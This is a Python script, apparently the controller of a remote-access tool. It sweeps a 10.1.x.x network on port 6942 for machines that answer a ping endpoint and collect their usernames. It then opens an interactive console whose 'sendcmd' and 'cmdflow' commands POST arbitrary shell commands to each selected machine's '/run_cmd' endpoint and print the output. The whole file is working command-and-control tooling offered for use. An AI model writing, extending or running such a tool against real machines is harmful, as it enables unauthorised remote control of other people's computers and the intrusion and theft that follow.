import requests
import concurrent.futures


def get_urls():
    out = []
    for num in range(1, 128):
        for num2 in range(1, 128):
            out.append('http://10.1.'+str(num2)+'.'+str(num)+':6942/ping')
    
    return out


def load_url(url, timeout):
    return requests.get(url, timeout=timeout)


resp_ok = 0
resp_err = 0

successful_urls = []

with concurrent.futures.ThreadPoolExecutor(max_workers=128**2) as executor:

    future_to_url = {executor.submit(
        load_url, url, 10): url for url in get_urls()}
    for future in concurrent.futures.as_completed(future_to_url):
        url = future_to_url[future]
        try:
            data = future.result()
            successful_urls.append(
                {'url': url, 'user': data.json()['users'][0]})
            print('success: ' + url.split('/')[2])
        except Exception as exc:
            resp_err += 1
            print('fail: ' + url.split('/')[2])
        else:
            resp_ok += 1

for url in successful_urls:
    print(url['user']+': '+url['url'])

selected_user = None
while True:
    if selected_user == None:
        username = 'None'
    else:
        username = str(successful_urls[selected_user]['user'])
    inp = input(username+' > ')
    if inp in ['exit', 'quit']:
        break
    elif inp.split(' ')[0] == 'select':
        if len(inp.split(' ')) == 1:
            print('please give username of computer to connect to')
            continue
        prev_selected = selected_user
        selected_user = None
        for i, url in enumerate(successful_urls):
            if url['user'] == inp.split(' ')[1]:
                selected_user = i
        if selected_user == None:
            print('User %s is not present on the local network, please select a different user.' %
                  inp.split(' ')[1])
            selected_user = prev_selected
            continue
    elif inp.split(' ')[0] == 'deselect':
        selected_user = None
    elif inp.split(' ')[0] == 'sendcmd':
        if selected_user == None:
            print('No user selected, please select a user with\n\tselect <username>')
            continue
        print('Please input payload cmd below:')
        cmd = input(' > ')
        print(cmd + ' has been sent off to ' + username)
        if cmd == 'chrome':
            payload = {
                'cmd': '/Program Files/Google/Chrome/Application/chrome.exe'}
        else:
            payload = {'cmd': cmd}
        resp = requests.request(
            method='POST', url='http://'+successful_urls[selected_user]['url'].split('/')[2]+'/run_cmd', json=payload)
        print('Response: "\n'+resp.json()['response']+'\n"')
    elif inp.split(' ')[0] == 'cmdflow':
        if selected_user == None:
            print('No user selected, please select a user with\n\tselect <username>')
            continue
        print('Please input payload cmd below (type exit to exit the flow):')
        while True:
            cmd = input(' > ')
            if cmd == 'exit':
                break
            print(cmd + ' has been sent off to ' + username)
            if cmd == 'chrome':
                payload = {
                    'cmd': '/Program Files/Google/Chrome/Application/chrome.exe'}
            else:
                payload = {'cmd': cmd}
            resp = requests.request(
                method='POST', url='http://'+successful_urls[selected_user]['url'].split('/')[2]+'/run_cmd', json=payload)
            print('Response: "'+resp.json()['response']+'"')
